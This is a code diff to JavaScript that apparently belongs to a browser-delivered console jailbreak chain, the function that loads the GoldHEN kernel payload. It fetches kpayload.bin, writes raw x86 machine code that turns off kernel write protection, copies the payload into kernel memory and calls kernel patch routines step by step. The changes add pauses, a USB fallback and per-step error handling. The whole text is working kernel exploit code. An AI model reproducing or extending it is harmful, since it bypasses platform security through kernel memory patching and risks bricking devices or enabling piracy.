@@ -1183,8 +1183,10 @@ const KP_STEPS = [
 ];
 
 async function loadKpayloadSteps(k, kbase, room) {
+  var breathe = function() { return new Promise(function(r) { setTimeout(r, 1); }); };
   const c = host();
   say("[kp] fetching kpayload.bin...");
+  await breathe();
   var blob;
   try {
     blob = await Promise.race([
@@ -1192,11 +1194,17 @@ async function loadKpayloadSteps(k, kbase, room) {
       new Promise(function(_, rej) { setTimeout(function() { rej(new Error("fetch timeout 15s")); }, 15000); })
     ]);
   } catch (fe) {
-    say("[kp] fetch failed: " + (fe && fe.message ? fe.message : String(fe)));
-    return false;
+    say("[kp] http fetch failed: " + (fe && fe.message ? fe.message : String(fe)));
+    if (typeof readFromUSB === "function") {
+      say("[kp] trying USB fallback...");
+      await breathe();
+      try { blob = readFromUSB("kpayload.bin"); } catch (ue) { blob = null; }
+    }
+    if (!blob) return false;
   }
   if (!blob || !blob.length) { say("[kp] kpayload.bin not available"); return false; }
   say("[kp] " + blob.length + " bytes fetched");
+  await breathe();
 
   const size = (0x50000 + blob.length + 0x4fff) & ~0xfff;
   const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
@@ -1209,15 +1217,20 @@ async function loadKpayloadSteps(k, kbase, room) {
   codeAt(buf, GH.tram + 0x200).hex("c3");
   const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
   if (r3 === undefined || r3 === null) { say("[kp] gate page does not execute in ring 3"); return false; }
-  say("[kp] gate page executes in ring 3");
+  say("[kp] gate page ok");
+  await breathe();
 
+  var wchunk = 0;
   for (let o = 0; o < blob.length; o += 8) {
     let lo = 0, hi = 0;
     for (let j = 0; j < 4; j++) lo |= (blob[o + j] || 0) << (8 * j);
     for (let j = 0; j < 4; j++) hi |= (blob[o + 4 + j] || 0) << (8 * j);
     c.p.write8(plus(data, o), v(lo >>> 0, hi >>> 0));
+    wchunk += 8;
+    if (wchunk >= 65536) { wchunk = 0; await breathe(); }
   }
   say("[kp] kpayload staged at " + text(data));
+  await breathe();
 
   const t = plus(kbase, GH.rvaPad);
   const tram = { n: 0 };
@@ -1234,14 +1247,17 @@ async function loadKpayloadSteps(k, kbase, room) {
   const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
 
   say("[kp] kernel base " + text(kbase) + ", padding " + text(t));
+  await breathe();
   // patchset.bin skipped for FW 14.02: its hardcoded offsets are FW 14.00 only
   // and writing JMP [RSI] (FF 26) to the wrong kernel address causes a kernel panic.
   // GoldHEN's own KP_STEPS (patch groups 1-6) apply all required kernel patches
   // themselves with the correct offsets derived from the shiftfit at stage [7b].
   const dmapPad = paddingRW(k, kbase);
   if (!dmapPad) { say("[kp] stopping: padding setup failed"); return false; }
+  await breathe();
 
   say("[kp] rep movsb -> dmap " + text(dmapPad));
+  await breathe();
   tram.n = 0;
   wpOff();
   hex("48be"); q64(data);
@@ -1253,42 +1269,53 @@ async function loadKpayloadSteps(k, kbase, room) {
   hex("0f0138");              // invlpg [rax] -- flush stale TLB entry after paddingRW
   hex("b8"); i32(0x5758); hex("c3");
   const cp = fire();
+  await breathe();
   if (cp !== 0x5758) { say("[kp] copy returned 0x" + cp.toString(16)); return false; }
   say("[kp] " + blob.length + " bytes into the padding");
+  await breathe();
 
   let silent = 0;
   for (let n = 0; n < KP_STEPS.length; n++) {
+    await breathe();
     const rva = KP_STEPS[n][0], what = KP_STEPS[n][1];
-    markClear();
-    tram.n = 0;
-    wpOff();
-    const stepStack = plus(t, 0xff000);
-    hex("48b9"); q64(stepStack); hex("488921");   /* [stepStack] = rsp */
-    hex("48bc"); q64(stepStack);                  /* rsp = stepStack */
-    hex("31ff"); hex("31f6"); hex("31c0");        /* rdi=0, esi=0, eax=0 */
-    callAbs(rva);
-    hex("4898");
-    hex("48b9"); q64(plus(buf, GH.mark));
-    hex("488901");
-    hex("48b9"); q64(stepStack); hex("488b21");   /* rsp = [stepStack] */
-    wpOn(); hex("31c0"); hex("c3");
-    say("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (stack " + text(stepStack) + ")");
-    fire();
-    const mk = markRead();
-    if (mk[1] === 0xDEADBEEF) {
-      say("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
+    say("[kp] [" + (n + 1) + "/" + KP_STEPS.length + "] " + what);
+    await breathe();
+    try {
+      markClear();
+      tram.n = 0;
+      wpOff();
+      const stepStack = plus(t, 0xff000);
+      hex("48b9"); q64(stepStack); hex("488921");
+      hex("48bc"); q64(stepStack);
+      hex("31ff"); hex("31f6"); hex("31c0");
+      callAbs(rva);
+      hex("4898");
+      hex("48b9"); q64(plus(buf, GH.mark));
+      hex("488901");
+      hex("48b9"); q64(stepStack); hex("488b21");
+      wpOn(); hex("31c0"); hex("c3");
+      fire();
+      await breathe();
+      const mk = markRead();
+      if (mk[1] === 0xDEADBEEF) {
+        say("[kp] [" + (n + 1) + "] did NOT return -- " + what);
+        silent++;
+        break;
+      }
+      let rc = mk[0];
+      if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
+      say("[kp] [" + (n + 1) + "] rc=" + rc + " -- " + what);
+      if (n === 0 && rc !== 0) {
+        say("[kp] init failed -- stopping");
+        return false;
+      }
+    } catch (stepErr) {
+      say("[kp] [" + (n + 1) + "] exception: " + (stepErr && stepErr.message ? stepErr.message : String(stepErr)));
       silent++;
       break;
     }
-    let rc = mk[0];
-    if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-    say("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc + " -- " + what);
-    if (n === 0 && rc !== 0) {
-      say("[kp] init failed -- stopping before a bad call");
-      return false;
-    }
   }
-  say("[kp] kpayload patch chain finished, " + silent + " silent");
+  say("[kp] kpayload chain done, " + silent + " silent");
   return silent === 0;
 }/* ------------------------------------------------------- GoldHEN */
 
